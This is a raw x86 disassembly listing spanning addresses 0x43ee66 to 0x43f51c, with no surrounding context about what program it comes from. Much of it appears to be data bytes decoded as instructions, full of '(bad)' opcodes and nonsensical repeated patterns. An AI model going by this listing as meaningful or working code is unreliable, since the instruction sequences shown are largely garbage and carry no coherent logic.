  43ee66:	inc    DWORD PTR [eax]
  43ee68:	add    BYTE PTR [edi+edi*8],ch
  43ee6b:	add    BYTE PTR [eax],al
  43ee6d:	xor    eax,0x520000ff
  43ee72:	inc    DWORD PTR [eax]
  43ee74:	add    BYTE PTR [edx-0x1],dh
  43ee77:	add    eax,0xffd922
  43ee7c:	push   cs
  43ee7d:	(bad)  
  43ee7e:	inc    DWORD PTR [eax]
  43ee80:	adc    eax,0x1000fffe
  43ee85:	idiv   bh
  43ee87:	add    BYTE PTR [ebx],cl
  43ee89:	(bad)  
  43ee8a:	dec    DWORD PTR [ecx]
  43ee8c:	push   cs
  43ee8d:	(bad)  
  43ee8e:	jmp    DWORD PTR [ebx+eiz*1]
  43ee91:	pop    edi
  43ee92:	jmp    DWORD PTR [ecx]
  43ee94:	sbb    BYTE PTR [eax],bh
  43ee96:	jmp    DWORD PTR [edx+eiz*1]
  43ee99:	dec    esi
  43ee9a:	jmp    DWORD PTR [ecx]
  43ee9c:	sbb    eax,DWORD PTR [edx-0x1]
  43ee9f:	or     al,0x12
  43eea1:	push   esp
  43eea2:	jmp    DWORD PTR [eax]
  43eea4:	dec    eax
  43eea5:	mov    ds:0xd59a37ff,eax
  43eeaa:	inc    DWORD PTR [edx*1+0x100ffe4]
  43eeb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43eeb2:	inc    DWORD PTR [eax]
  43eeb4:	add    BYTE PTR [edx-0x1],dh
  43eeb7:	add    BYTE PTR [eax],al
  43eeb9:	inc    ebp
  43eeba:	inc    DWORD PTR [eax]
  43eebc:	add    BYTE PTR ds:0x2a0000ff,ch
  43eec2:	inc    DWORD PTR [eax]
  43eec4:	add    BYTE PTR [ebx],ah
  43eec6:	inc    DWORD PTR [eax]
  43eec8:	add    BYTE PTR [edi],bl
  43eeca:	inc    DWORD PTR [eax]
  43eecc:	add    BYTE PTR [edi+edi*8],ah
  43eecf:	add    BYTE PTR [eax],al
  43eed1:	sub    edi,edi
  43eed3:	add    BYTE PTR [eax],al
  43eed5:	daa    
  43eed6:	inc    DWORD PTR [eax]
  43eed8:	add    BYTE PTR [edx],ch
  43eeda:	inc    DWORD PTR [eax]
  43eedc:	add    BYTE PTR [eax],bh
  43eede:	inc    DWORD PTR [eax]
  43eee0:	add    BYTE PTR [ecx-0x1],cl
  43eee3:	add    BYTE PTR [eax],al
  43eee5:	jbe    0x43eee6
  43eee7:	add    BYTE PTR [eax],al
  43eee9:	test   eax,0xe0832fff
  43eeee:	jmp    FWORD PTR [esi]
  43eef0:	enter  0xfff7,0x27
  43eef4:	jno    0x43eec6
  43eef6:	call   FWORD PTR [esi]
  43eef8:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  43eefa:	call   FWORD PTR ds:0x1effaa3f
  43ef00:	cmp    ebp,DWORD PTR [edi-0x47c0e501]
  43ef06:	call   DWORD PTR [ebx]
  43ef08:	sub    edx,DWORD PTR [ecx+0x69180bff]
  43ef0e:	dec    DWORD PTR [ecx]
  43ef10:	sbb    edx,DWORD PTR [eax-0x35c4f001]
  43ef16:	dec    DWORD PTR ds:0xbffc736
  43ef1c:	xor    edx,ecx
  43ef1e:	inc    DWORD PTR [esi]
  43ef20:	inc    esp
  43ef21:	int3   
  43ef22:	jmp    FWORD PTR [edi-0x1]
  43ef25:	(bad)  
  43ef26:	jmp    DWORD PTR [ecx-0x4b]
  43ef29:	(bad)  
  43ef2a:	inc    DWORD PTR [eax]
  43ef2c:	add    BYTE PTR [ecx+0x700000ff],dh
  43ef32:	inc    DWORD PTR [eax]
  43ef34:	add    BYTE PTR [eax-0x1],cl
  43ef37:	add    BYTE PTR [eax],al
  43ef39:	daa    
  43ef3a:	inc    DWORD PTR [eax]
  43ef3c:	add    BYTE PTR [edx],bl
  43ef3e:	inc    DWORD PTR [eax]
  43ef40:	add    BYTE PTR [ecx],dl
  43ef42:	inc    DWORD PTR [eax]
  43ef44:	add    BYTE PTR [edi],cl
  43ef46:	inc    DWORD PTR [eax]
  43ef48:	add    BYTE PTR [ebx],dl
  43ef4a:	inc    DWORD PTR [eax]
  43ef4c:	add    BYTE PTR [edx],dl
  43ef4e:	inc    DWORD PTR [eax]
  43ef50:	add    BYTE PTR [esi],ah
  43ef52:	inc    DWORD PTR [eax]
  43ef54:	add    BYTE PTR [ebx-0x1],al
  43ef57:	add    BYTE PTR [eax],al
  43ef59:	ins    DWORD PTR es:[edi],dx
  43ef5a:	dec    DWORD PTR [ecx]
  43ef5c:	push   cs
  43ef5d:	stos   BYTE PTR es:[edi],al
  43ef5e:	jmp    FWORD PTR [ecx-0x66]
  43ef61:	enter  0x59ff,0x80
  43ef65:	test   eax,0xcea14bff
  43ef6a:	call   DWORD PTR [esi-0x4d]
  43ef6d:	(bad)  
  43ef6f:	and    esi,DWORD PTR [eax-0x11ff0030]
  43ef75:	cld    
  43ef76:	call   FWORD PTR [edx-0xb]
  43ef79:	cli    
  43ef7a:	call   DWORD PTR [edx+0x7b]
  43ef7d:	retf   0x3fff
  43ef80:	jne    0x43ef4b
  43ef82:	push   DWORD PTR [eax]
  43ef84:	dec    edi
  43ef85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43ef86:	push   DWORD PTR [ecx]
  43ef88:	dec    eax
  43ef89:	test   edi,edi
  43ef8b:	sub    BYTE PTR [ebx-0x3a],ah
  43ef8e:	jmp    FWORD PTR ds:0x18ffaf59
  43ef94:	es xchg edi,edi
  43ef97:	and    esi,DWORD PTR [ebx-0xf]
  43ef9a:	call   FWORD PTR ds:0xffffbe
  43efa0:	add    ch,bl
  43efa2:	inc    DWORD PTR [eax]
  43efa4:	or     DWORD PTR [eax-0x5effff01],esi
  43efaa:	inc    DWORD PTR [eax]
  43efac:	add    BYTE PTR [ebp-0x1],dh
  43efaf:	add    BYTE PTR [eax],al
  43efb1:	push   ebp
  43efb2:	inc    DWORD PTR [eax]
  43efb4:	add    BYTE PTR [edi+edi*8],bh
  43efb7:	add    BYTE PTR [eax],al
  43efb9:	sub    eax,0x260000ff
  43efbe:	inc    DWORD PTR [eax]
  43efc0:	add    BYTE PTR [edi+edi*8],bl
  43efc3:	add    BYTE PTR [eax],al
  43efc5:	sbb    eax,0x290000ff
  43efca:	inc    DWORD PTR [eax]
  43efcc:	add    BYTE PTR [eax],ch
  43efce:	inc    DWORD PTR [eax]
  43efd0:	add    BYTE PTR [ecx],ah
  43efd2:	inc    DWORD PTR [eax]
  43efd4:	add    BYTE PTR [eax],ah
  43efd6:	inc    DWORD PTR [eax]
  43efd8:	add    BYTE PTR [ebx],ah
  43efda:	inc    DWORD PTR [eax]
  43efdc:	add    BYTE PTR [ecx],dh
  43efde:	inc    DWORD PTR [eax]
  43efe0:	add    BYTE PTR [edi+edi*8+0x0],al
  43efe4:	add    BYTE PTR [esi-0x1],bl
  43efe7:	add    BYTE PTR [eax],al
  43efe9:	xchg   ecx,eax
  43efea:	call   DWORD PTR [esi]
  43efec:	push   ss
  43efed:	leave  
  43efee:	dec    ebx
  43eff0:	jmp    0x7c7befe0
  43eff5:	aam    0xff
  43eff7:	add    BYTE PTR [edx],al
  43eff9:	retf   0xff
  43effc:	add    bh,al
  43effe:	inc    DWORD PTR [eax]
  43f000:	add    BYTE PTR [eax-0x3cb1d301],dh
  43f006:	inc    ecx
  43f008:	idiv   cl
  43f00a:	push   DWORD PTR [esi-0x36]
  43f00d:	out    dx,eax
  43f00e:	inc    DWORD PTR [eax]
  43f010:	add    BYTE PTR [edx+0x760306ff],cl
  43f016:	dec    DWORD PTR [ebx]
  43f018:	(bad)  
  43f019:	jmp    0x43f01a
  43f01b:	add    BYTE PTR [ebx],al
  43f01d:	xchg   edx,eax
  43f01e:	inc    DWORD PTR [eax]
  43f020:	add    BYTE PTR [edx+0x6b0000ff],bl
  43f026:	inc    DWORD PTR [eax]
  43f028:	add    BYTE PTR [esi-0x1],cl
  43f02b:	add    BYTE PTR [eax],al
  43f02d:	xor    bh,bh
  43f02f:	add    BYTE PTR [eax],al
  43f031:	sub    edi,edi
  43f033:	add    BYTE PTR [eax],al
  43f035:	sub    bh,bh
  43f037:	add    BYTE PTR [eax],al
  43f039:	and    eax,0x280000ff
  43f03e:	inc    DWORD PTR [eax]
  43f040:	add    BYTE PTR [edx],ah
  43f042:	inc    DWORD PTR [eax]
  43f044:	add    BYTE PTR [edi],ch
  43f046:	inc    DWORD PTR [eax]
  43f048:	add    BYTE PTR [esi],ah
  43f04a:	inc    DWORD PTR [eax]
  43f04c:	add    BYTE PTR [edx],ah
  43f04e:	inc    DWORD PTR [eax]
  43f050:	add    BYTE PTR [edx],ch
  43f052:	inc    DWORD PTR [eax]
  43f054:	add    BYTE PTR [edx],ch
  43f056:	inc    DWORD PTR [eax]
  43f058:	add    BYTE PTR [edi+edi*8],ch
  43f05b:	add    BYTE PTR [eax],al
  43f05d:	and    eax,0x240000ff
  43f062:	inc    DWORD PTR [eax]
  43f064:	add    BYTE PTR ds:0x370000ff,ch
  43f06a:	inc    DWORD PTR [eax]
  43f06c:	add    BYTE PTR [edx],bh
  43f06e:	inc    DWORD PTR [eax]
  43f070:	add    BYTE PTR [edx-0x1],bl
  43f073:	add    BYTE PTR [eax],al
  43f075:	cmp    bh,0x0
  43f078:	push   ss
  43f079:	(bad)  
  43f07b:	add    al,0x32
  43f07d:	iret   
  43f07e:	inc    DWORD PTR [ecx]
  43f080:	or     eax,edx
  43f082:	inc    DWORD PTR [edx+esi*1]
  43f085:	loope  0x43f086
  43f087:	add    al,0x3a
  43f089:	(bad)  
  43f08a:	inc    DWORD PTR ds:0x24ffbb1d
  43f090:	sub    ch,BYTE PTR [edi+edi*8]
  43f093:	sub    DWORD PTR ds:0x1c22ff5f,esp
  43f099:	inc    edx
  43f09a:	call   FWORD PTR [eax]
  43f09c:	sbb    al,0x54
  43f09e:	call   FWORD PTR [edi]
  43f0a0:	xor    DWORD PTR [edx-0x5ac0e201],ecx
  43f0a6:	(bad)  
  43f0a7:	cmp    ecx,DWORD PTR [ebp+eax*8-0x4cff501]
  43f0ae:	inc    DWORD PTR [ebx]
  43f0b0:	or     ecx,edx
  43f0b2:	inc    DWORD PTR [eax]
  43f0b4:	add    BYTE PTR [ecx-0x1],bh
  43f0b7:	add    BYTE PTR [eax],al
  43f0b9:	dec    esi
  43f0ba:	inc    DWORD PTR [eax]
  43f0bc:	add    BYTE PTR [edi],dh
  43f0be:	inc    DWORD PTR [eax]
  43f0c0:	add    BYTE PTR [eax],ah
  43f0c2:	inc    DWORD PTR [eax]
  43f0c4:	add    BYTE PTR [edx],ah
  43f0c6:	inc    DWORD PTR [eax]
  43f0c8:	add    BYTE PTR [esi],bl
  43f0ca:	inc    DWORD PTR [eax]
  43f0cc:	add    BYTE PTR [edx],bl
  43f0ce:	inc    DWORD PTR [eax]
  43f0d0:	add    BYTE PTR [ecx],ah
  43f0d2:	inc    DWORD PTR [eax]
  43f0d4:	add    BYTE PTR [eax],ah
  43f0d6:	inc    DWORD PTR [eax]
  43f0d8:	add    BYTE PTR [edx],ah
  43f0da:	inc    DWORD PTR [eax]
  43f0dc:	add    BYTE PTR [edi+edi*8],ch
  43f0df:	add    BYTE PTR [eax],al
  43f0e1:	cmp    edi,edi
  43f0e3:	add    BYTE PTR [eax],al
  43f0e5:	pop    ecx
  43f0e6:	inc    DWORD PTR [eax]
  43f0e8:	add    BYTE PTR [eax-0x269edf01],cl
  43f0ee:	push   DWORD PTR [ecx]
  43f0f0:	popf   
  43f0f1:	jmp    0x16ff:0xd44108ff
  43f0f8:	xor    eax,0x5326ffb2
  43f0fd:	mov    ebx,0xb44520ff
  43f102:	call   DWORD PTR [esi]
  43f104:	cmp    BYTE PTR [esi+0x741c0dff],dh
  43f10a:	dec    DWORD PTR [ecx]
  43f10c:	push   ds
  43f10d:	ja     0x43f10e
  43f10f:	or     DWORD PTR [edi+edi*2],ebx
  43f112:	dec    DWORD PTR ds:0xdffbe34
  43f118:	xor    eax,0x350bffc8
  43f11d:	int3   
  43f11e:	inc    DWORD PTR [eax]
  43f120:	sbb    al,0xc8
  43f122:	dec    DWORD PTR [esi-0x32]
  43f125:	idiv   edi
  43f127:	jg     0x43f128
  43f129:	(bad)  
  43f12a:	inc    DWORD PTR [eax]
  43f12c:	add    cl,dl
  43f12e:	inc    DWORD PTR [eax]
  43f130:	add    BYTE PTR [esi-0x1],bh
  43f133:	add    BYTE PTR [eax],al
  43f135:	push   ecx
  43f136:	inc    DWORD PTR [eax]
  43f138:	add    BYTE PTR [ebx],ah
  43f13a:	inc    DWORD PTR [eax]
  43f13c:	add    BYTE PTR [eax],bl
  43f13e:	inc    DWORD PTR [eax]
  43f140:	add    BYTE PTR [eax],bl
  43f142:	inc    DWORD PTR [eax]
  43f144:	add    BYTE PTR ds:0x130000ff,cl
  43f14a:	inc    DWORD PTR [eax]
  43f14c:	add    BYTE PTR [esi],cl
  43f14e:	inc    DWORD PTR [eax]
  43f150:	add    BYTE PTR [eax],ah
  43f152:	inc    DWORD PTR [eax]
  43f154:	add    BYTE PTR [eax-0x1],al
  43f157:	add    BYTE PTR [eax],al
  43f159:	ins    BYTE PTR es:[edi],dx
  43f15a:	inc    DWORD PTR [eax]
  43f15c:	add    BYTE PTR [esi-0x3ba4bf01],ah
  43f162:	jmp    FWORD PTR ds:0x4affd361
  43f168:	mov    eax,ds:0xa330ffff
  43f16d:	aad    0xff
  43f16f:	push   ss
  43f170:	dec    edi
  43f171:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43f172:	inc    DWORD PTR [ecx]
  43f174:	pop    edi
  43f175:	(bad)  
  43f176:	push   DWORD PTR [edx]
  43f178:	lods   eax,DWORD PTR ds:[esi]
  43f179:	lock (bad) 
  43f17b:	ds xchg ah,cl
  43f17e:	call   DWORD PTR [eax-0x71]
  43f181:	sar    bh,1
  43f183:	ds ins DWORD PTR es:[edi],dx
  43f185:	(bad)  
  43f186:	(bad)  
  43f187:	cmp    eax,0x1effb361
  43f18c:	fs int 0xff
  43f18f:	push   es
  43f190:	sub    DWORD PTR [edi+0x5f1619ff],esp
  43f196:	call   FWORD PTR [ebp+ecx*8-0xa]
  43f19a:	jmp    FWORD PTR ds:0xfffed5
  43f1a0:	add    ch,bl
  43f1a2:	inc    DWORD PTR [eax]
  43f1a4:	add    BYTE PTR [edi+edi*8-0x860000],ch
  43f1ab:	add    BYTE PTR [eax],al
  43f1ad:	push   esp
  43f1ae:	inc    DWORD PTR [eax]
  43f1b0:	add    BYTE PTR [edi+edi*8],bh
  43f1b3:	add    BYTE PTR [eax],al
  43f1b5:	sub    edi,edi
  43f1b7:	add    BYTE PTR [eax],al
  43f1b9:	and    edi,edi
  43f1bb:	add    BYTE PTR [eax],al
  43f1bd:	and    bh,bh
  43f1bf:	add    BYTE PTR [eax],al
  43f1c1:	and    bh,bh
  43f1c3:	add    BYTE PTR [eax],al
  43f1c5:	sub    edi,edi
  43f1c7:	add    BYTE PTR [eax],al
  43f1c9:	sbb    edi,edi
  43f1cb:	add    BYTE PTR [eax],al
  43f1cd:	and    bh,bh
  43f1cf:	add    BYTE PTR [eax],al
  43f1d1:	sbb    eax,0x220000ff
  43f1d6:	inc    DWORD PTR [eax]
  43f1d8:	add    BYTE PTR [ebx],bl
  43f1da:	inc    DWORD PTR [eax]
  43f1dc:	add    BYTE PTR ds:0x350000ff,bl
  43f1e2:	inc    DWORD PTR [eax]
  43f1e4:	add    BYTE PTR [eax-0x1],dl
  43f1e7:	add    BYTE PTR [eax],al
  43f1e9:	imul   edi,edi,0x0
  43f1ec:	add    BYTE PTR [ebp-0x57ceff01],al
  43f1f2:	inc    DWORD PTR [eax]
  43f1f4:	push   cs
  43f1f5:	sar    bh,0x0
  43f1f8:	add    dh,al
  43f1fa:	inc    DWORD PTR ds:0x34ffb103
  43f200:	dec    eax
  43f201:	test   eax,0xffec8cff
  43f206:	(bad)  
  43f207:	cmp    eax,0x12ffe491
  43f20c:	xor    DWORD PTR [ebp-0x3fb6ec01],edi
  43f212:	call   DWORD PTR [eax]
  43f214:	aaa    
  43f215:	mov    ecx,0xd3832bff
  43f21a:	inc    DWORD PTR [edx]
  43f21c:	pop    es
  43f21d:	(bad)  
  43f21e:	inc    DWORD PTR [eax]
  43f220:	add    BYTE PTR [ebp+0x740000ff],ah
  43f226:	inc    DWORD PTR [eax]
  43f228:	add    BYTE PTR [ebp-0x1],dl
  43f22b:	add    BYTE PTR [eax],al
  43f22d:	cmp    al,0xff
  43f22f:	add    BYTE PTR [eax],al
  43f231:	and    edi,edi
  43f233:	add    BYTE PTR [eax],al
  43f235:	and    edi,edi
  43f237:	add    BYTE PTR [eax],al
  43f239:	sbb    al,0xff
  43f23b:	add    BYTE PTR [eax],al
  43f23d:	sbb    edi,edi
  43f23f:	add    BYTE PTR [eax],al
  43f241:	sbb    eax,0x2b0000ff
  43f246:	inc    DWORD PTR [eax]
  43f248:	add    BYTE PTR [esi],bl
  43f24a:	inc    DWORD PTR [eax]
  43f24c:	add    BYTE PTR [ecx],ch
  43f24e:	inc    DWORD PTR [eax]
  43f250:	add    BYTE PTR [edi],ch
  43f252:	inc    DWORD PTR [eax]
  43f254:	add    BYTE PTR ds:0x250000ff,ch
  43f25a:	inc    DWORD PTR [eax]
  43f25c:	add    BYTE PTR [ecx],ch
  43f25e:	inc    DWORD PTR [eax]
  43f260:	add    BYTE PTR [ebx],ch
  43f262:	inc    DWORD PTR [eax]
  43f264:	add    BYTE PTR [edi+edi*8],ah
  43f267:	add    BYTE PTR [eax],al
  43f269:	inc    DWORD PTR es:[eax]
  43f26c:	add    BYTE PTR [edi],bh
  43f26e:	inc    DWORD PTR [eax]
  43f270:	add    BYTE PTR [edi-0x1],dl
  43f273:	add    BYTE PTR [eax],al
  43f275:	mov    bh,bh
  43f277:	add    BYTE PTR [edi],al
  43f279:	loope  0x43f27a
  43f27b:	add    BYTE PTR [eax],dl
  43f27d:	mov    ds:0x10000ff,al
  43f282:	dec    DWORD PTR [ecx]
  43f284:	adc    al,0x5b
  43f286:	dec    DWORD PTR [edx]
  43f288:	xor    BYTE PTR [eax-0x79e2ff01],ah
  43f28e:	dec    DWORD PTR [edi]
  43f290:	daa    
  43f291:	pop    ebp
  43f292:	jmp    DWORD PTR ds:0x25ff7c34
  43f298:	sbb    al,0x48
  43f29a:	call   FWORD PTR [eax]
  43f29c:	sbb    al,0x4b
  43f29e:	jmp    DWORD PTR [eax]
  43f2a0:	xor    eax,DWORD PTR [edi-0x5ecde801]
  43f2a6:	(bad)  
  43f2a7:	cmp    bh,BYTE PTR [esi-0x4a]
  43f2aa:	call   FWORD PTR [ecx]
  43f2ac:	aas    
  43f2ad:	jecxz  0x43f2ae
  43f2af:	add    BYTE PTR [ecx],al
  43f2b1:	loopne 0x43f2b2
  43f2b3:	add    BYTE PTR [eax],al
  43f2b5:	jg     0x43f2b6
  43f2b7:	add    BYTE PTR [eax],al
  43f2b9:	pop    ebx
  43f2ba:	inc    DWORD PTR [eax]
  43f2bc:	add    BYTE PTR ds:0x230000ff,dh
  43f2c2:	inc    DWORD PTR [eax]
  43f2c4:	add    BYTE PTR [edi],bl
  43f2c6:	inc    DWORD PTR [eax]
  43f2c8:	add    BYTE PTR [edi+edi*8],ah
  43f2cb:	add    BYTE PTR [eax],al
  43f2cd:	push   ds
  43f2ce:	inc    DWORD PTR [eax]
  43f2d0:	add    BYTE PTR [ebx],bl
  43f2d2:	inc    DWORD PTR [eax]
  43f2d4:	add    BYTE PTR [edx],bl
  43f2d6:	inc    DWORD PTR [eax]
  43f2d8:	add    BYTE PTR [edi+edi*8],bl
  43f2db:	add    BYTE PTR [eax],al
  43f2dd:	and    bh,bh
  43f2df:	add    BYTE PTR [eax],al
  43f2e1:	sub    edi,edi
  43f2e3:	add    BYTE PTR [eax],al
  43f2e5:	inc    edi
  43f2e6:	inc    DWORD PTR [eax]
  43f2e8:	add    BYTE PTR [eax-0x1],dh
  43f2eb:	add    al,0x16
  43f2ed:	stos   BYTE PTR es:[edi],al
  43f2ee:	dec    DWORD PTR [edx-0x47]
  43f2f1:	in     eax,dx
  43f2f2:	dec    DWORD PTR [edi]
  43f2f4:	outs   dx,DWORD PTR ds:[esi]
  43f2f5:	lock inc DWORD PTR [edx]
  43f2f8:	cmp    edi,ecx
  43f2fa:	call   FWORD PTR [ecx]
  43f2fc:	ss mov ebp,0x923118ff
  43f302:	dec    DWORD PTR ds:0xeff8f24
  43f308:	pop    ds
  43f309:	jns    0x43f30a
  43f30b:	or     al,0x23
  43f30d:	jle    0x43f30e
  43f30f:	or     BYTE PTR [eax],bl
  43f311:	push   0xa22a0dff
  43f316:	dec    DWORD PTR [edi]
  43f318:	xor    eax,edx
  43f31a:	dec    DWORD PTR [ecx]
  43f31c:	sub    bh,BYTE PTR [edi+edi*8-0x35e400]
  43f323:	xor    bl,BYTE PTR [edi-0x850014]
  43f329:	sti    
  43f32a:	inc    DWORD PTR [edi]
  43f32c:	push   ss
  43f32d:	fdivp  st(7),st
  43f32f:	add    BYTE PTR [eax],al
  43f331:	xchg   bh,bh
  43f333:	add    BYTE PTR [eax],al
  43f335:	pop    ecx
  43f336:	inc    DWORD PTR [eax]
  43f338:	add    BYTE PTR [edi],ch
  43f33a:	inc    DWORD PTR [eax]
  43f33c:	add    BYTE PTR [edi],bl
  43f33e:	inc    DWORD PTR [eax]
  43f340:	add    BYTE PTR ds:0xf0000ff,cl
  43f346:	inc    DWORD PTR [eax]
  43f348:	add    BYTE PTR [ebx],dl
  43f34a:	inc    DWORD PTR [eax]
  43f34c:	add    BYTE PTR [edx],dl
  43f34e:	inc    DWORD PTR [eax]
  43f350:	add    BYTE PTR [edi],bl
  43f352:	inc    DWORD PTR [eax]
  43f354:	add    BYTE PTR [edi+edi*8],bh
  43f357:	add    BYTE PTR [eax],al
  43f359:	inc    DWORD PTR [bx+si]
  43f35c:	add    BYTE PTR [edx-0x5aedfc01],ah
  43f362:	(bad)  
  43f363:	cmp    al,0x86
  43f365:	mov    ebp,0xffc33dff
  43f36a:	inc    DWORD PTR [ebx]
  43f36c:	cmp    dh,ch
  43f36e:	jmp    FWORD PTR [edx]
  43f370:	cmp    ch,BYTE PTR [edi+edi*8-0x34c0eb]
  43f377:	inc    edi
  43f378:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f379:	jmp    0x13ff:0xfd9b2dff
  43f380:	inc    esi
  43f381:	xlat   BYTE PTR ds:[ebx]
  43f382:	push   DWORD PTR [edx]
  43f384:	dec    ecx
  43f385:	cwde   
  43f386:	(bad)  
  43f387:	cmp    eax,0x2affc569
  43f38c:	fs int 0xff
  43f38f:	add    esp,DWORD PTR [ecx]
  43f391:	xchg   ecx,eax
  43f392:	jmp    DWORD PTR [edx+eiz*1]
  43f395:	push   edx
  43f396:	call   DWORD PTR [ebp-0xe]
  43f399:	cld    
  43f39a:	call   FWORD PTR ds:0xfffc88
  43f3a0:	add    ch,al
  43f3a2:	inc    DWORD PTR [eax]
  43f3a4:	add    BYTE PTR [eax+0x650000ff],dl
  43f3aa:	inc    DWORD PTR [eax]
  43f3ac:	add    BYTE PTR [edi],bh
  43f3ae:	inc    DWORD PTR [eax]
  43f3b0:	add    BYTE PTR [edi+edi*8],ch
  43f3b3:	add    BYTE PTR [eax],al
  43f3b5:	and    bh,bh
  43f3b7:	add    BYTE PTR [eax],al
  43f3b9:	sbb    edi,edi
  43f3bb:	add    BYTE PTR [eax],al
  43f3bd:	push   ss
  43f3be:	inc    DWORD PTR [eax]
  43f3c0:	add    BYTE PTR ds:0x190000ff,ah
  43f3c6:	inc    DWORD PTR [eax]
  43f3c8:	add    BYTE PTR [eax],bl
  43f3ca:	inc    DWORD PTR [eax]
  43f3cc:	add    BYTE PTR [eax],ch
  43f3ce:	inc    DWORD PTR [eax]
  43f3d0:	add    BYTE PTR [edi],ah
  43f3d2:	inc    DWORD PTR [eax]
  43f3d4:	add    BYTE PTR [ecx],bl
  43f3d6:	inc    DWORD PTR [eax]
  43f3d8:	add    BYTE PTR [edi],ah
  43f3da:	inc    DWORD PTR [eax]
  43f3dc:	add    BYTE PTR [ebx],dh
  43f3de:	inc    DWORD PTR [eax]
  43f3e0:	add    BYTE PTR [edx],ch
  43f3e2:	inc    DWORD PTR [eax]
  43f3e4:	add    BYTE PTR [edi+edi*8],bh
  43f3e7:	add    BYTE PTR [eax],al
  43f3e9:	push   esp
  43f3ea:	inc    DWORD PTR [eax]
  43f3ec:	add    BYTE PTR [ecx-0x1],bh
  43f3ef:	add    BYTE PTR [eax],al
  43f3f1:	cwde   
  43f3f2:	inc    DWORD PTR [eax]
  43f3f4:	add    BYTE PTR [ebp-0x38f2f501],bh
  43f3fa:	dec    DWORD PTR [ecx+0x69]
  43f3fd:	sar    edi,1
  43f3ff:	data16 (bad) 
  43f403:	es (bad) 
  43f405:	enter  0x5ff,0x13
  43f409:	mov    edi,edi
  43f40b:	adc    esi,DWORD PTR [ecx]
  43f40d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43f40e:	call   DWORD PTR [ebx+edi*1]
  43f411:	pushf  
  43f412:	call   FWORD PTR [edx]
  43f414:	inc    edi
  43f415:	mov    bh,0xff
  43f417:	and    bl,BYTE PTR [ebx-0x2d]
  43f41a:	dec    DWORD PTR [ecx]
  43f41c:	pop    ss
  43f41d:	loopne 0x43f41e
  43f41f:	add    BYTE PTR [ecx],al
  43f421:	mov    esp,0x870000ff
  43f426:	inc    DWORD PTR [eax]
  43f428:	add    BYTE PTR [ebp-0x1],bl
  43f42b:	add    BYTE PTR [eax],al
  43f42d:	inc    eax
  43f42e:	inc    DWORD PTR [eax]
  43f430:	add    BYTE PTR [ebx],dh
  43f432:	inc    DWORD PTR [eax]
  43f434:	add    BYTE PTR [edx],ah
  43f436:	inc    DWORD PTR [eax]
  43f438:	add    BYTE PTR [eax],ah
  43f43a:	inc    DWORD PTR [eax]
  43f43c:	add    BYTE PTR [edx],ah
  43f43e:	inc    DWORD PTR [eax]
  43f440:	add    BYTE PTR [edi],bl
  43f442:	inc    DWORD PTR [eax]
  43f444:	add    BYTE PTR [ebx],ch
  43f446:	inc    DWORD PTR [eax]
  43f448:	add    BYTE PTR [ebx],ah
  43f44a:	inc    DWORD PTR [eax]
  43f44c:	add    BYTE PTR ds:0x240000ff,bl
  43f452:	inc    DWORD PTR [eax]
  43f454:	add    BYTE PTR [esi],ah
  43f456:	inc    DWORD PTR [eax]
  43f458:	add    BYTE PTR [edx],ch
  43f45a:	inc    DWORD PTR [eax]
  43f45c:	add    BYTE PTR ds:0x270000ff,ah
  43f462:	inc    DWORD PTR [eax]
  43f464:	add    BYTE PTR [eax],dh
  43f466:	inc    DWORD PTR [eax]
  43f468:	add    BYTE PTR [eax],ch
  43f46a:	inc    DWORD PTR [eax]
  43f46c:	add    BYTE PTR [ebx-0x1],al
  43f46f:	add    BYTE PTR [eax],al
  43f471:	push   esp
  43f472:	inc    DWORD PTR [eax]
  43f474:	add    BYTE PTR [ebp-0x1ef4ff01],al
  43f47a:	inc    DWORD PTR [eax]
  43f47c:	setnp  bh
  43f47f:	add    BYTE PTR [edx],cl
  43f481:	sub    edi,edi
  43f483:	add    al,0x1e
  43f485:	test   eax,0x622c23ff
  43f48a:	dec    DWORD PTR [edx]
  43f48c:	adc    al,0x44
  43f48e:	inc    DWORD PTR [eax]
  43f490:	push   cs
  43f491:	dec    edi
  43f492:	call   FWORD PTR [ebx]
  43f494:	aas    
  43f495:	sahf   
  43f496:	call   FWORD PTR [edi+eiz*1]
  43f499:	call   FWORD PTR [bp+si]
  43f49c:	and    eax,0x2a1dff65
  43f4a1:	push   0xffffffff
  43f4a3:	push   ds
  43f4a4:	ss fwait
  43f4a6:	jmp    FWORD PTR [ecx]
  43f4a8:	pop    edx
  43f4a9:	xchg   esp,eax
  43f4aa:	call   DWORD PTR [eax+edi*1]
  43f4ad:	jmp    0xff:0xe00a00ff
  43f4b4:	add    BYTE PTR [edx+0x680000ff],dl
  43f4ba:	inc    DWORD PTR [eax]
  43f4bc:	add    BYTE PTR [edi+edi*8],bh
  43f4bf:	add    BYTE PTR [eax],al
  43f4c1:	sub    al,0xff
  43f4c3:	add    BYTE PTR [eax],al
  43f4c5:	push   ss
  43f4c6:	inc    DWORD PTR [eax]
  43f4c8:	add    BYTE PTR ds:0x190000ff,bl
  43f4ce:	inc    DWORD PTR [eax]
  43f4d0:	add    BYTE PTR [edi],dl
  43f4d2:	inc    DWORD PTR [eax]
  43f4d4:	add    BYTE PTR [edx],ah
  43f4d6:	inc    DWORD PTR [eax]
  43f4d8:	add    BYTE PTR [eax],bl
  43f4da:	inc    DWORD PTR [eax]
  43f4dc:	add    BYTE PTR [eax],ah
  43f4de:	inc    DWORD PTR [eax]
  43f4e0:	add    BYTE PTR [esi],ah
  43f4e2:	inc    DWORD PTR [eax]
  43f4e4:	add    BYTE PTR ds:0x5e0000ff,bh
  43f4ea:	inc    DWORD PTR [eax]
  43f4ec:	add    BYTE PTR [edx-0x2a9ce101],dl
  43f4f2:	jmp    FWORD PTR [eax]
  43f4f4:	cmp    edi,0xffffffff
  43f4f7:	aaa    
  43f4f8:	xchg   ebp,eax
  43f4f9:	jmp    0xfff:0xa41c0fff
  43f500:	xor    al,0xba
  43f502:	dec    DWORD PTR [edi]
  43f504:	sub    ebx,DWORD PTR [esi-0x5cceee01]
  43f50a:	dec    DWORD PTR [ebx+ebx*1]
  43f50d:	dec    DWORD PTR gs:[ecx]
  43f510:	pop    ss
  43f511:	(bad)  
  43f512:	dec    DWORD PTR [eax]
  43f514:	push   ss
  43f515:	dec    DWORD PTR fs:0x9ffa729
  43f51c:	sbb    al,0xa1
